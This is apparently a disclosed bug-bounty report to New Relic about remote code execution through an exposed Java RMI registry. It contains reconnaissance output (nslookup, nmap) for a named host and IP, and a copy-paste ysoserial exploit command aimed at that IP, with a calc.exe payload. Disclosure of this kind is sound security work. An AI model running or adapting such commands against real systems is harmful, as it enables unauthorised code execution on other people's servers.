@@ -1,0 +1,56 @@
+ReportLink:https://hackerone.com/reports/163547
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/leba
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:02.09.2016 20:42:07
+
+Summary:
+
+hello Guys 
+while i was testing your site i found an interesting domain of newrelic  which is pinger-master.newrelic.com
+and when i visit that domain it says unable to connect with the host the i quickly do nslookup and i got this results 
+fish@punt ~ $ nslookup pinger-master.newrelic.com
+Server:		127.0.1.1
+Address:	127.0.1.1#53
+
+Non-authoritative answer:
+Name:	pinger-master.newrelic.com
+Address: 50.31.164.157
+
+as u see that domain IP is  50.31.164.157 and i decide to scan your  port with nmap then i see that port 1099
+is open which is used by Java RMI
+
+fish@punt ~ $ nmap -sV 50.31.164.157
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2016-08-26 08:10 EDT
+Nmap scan report for pinger-master.newrelic.com (50.31.164.157)
+Host is up (0.26s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE     VERSION
+1098/tcp open  rmiregistry Java RMI
+1099/tcp open  rmiregistry Java RMI
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds
+
+then i remember that Foxglove security team have Announced that java RMI and other have a common bug that is Remote code Execution which leads your server to critical stage and here is the POC that the foxsec team have realsed 
+
+#POC JAVA RMI
+https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/      
+u can find about java RMI on  the end of the pages 
+#The Exploitation 
+
+the Attacker will download ysoserial  from https://github.com/frohoff/ysoserial/releases
+then he can execute what ever commands he wanted on your Server and that is so Critical ISSUE
+
+#POC  
+
+java -cp ysoserial-0.0.1-all.jar ysoserial.RMIRegistryExploit 50.31.164.157 1098 CommonsCollections1 calc.exe
+
+just Downland ysoserial and copy paste that command on port 1098   
+
+Thanks
+F :p
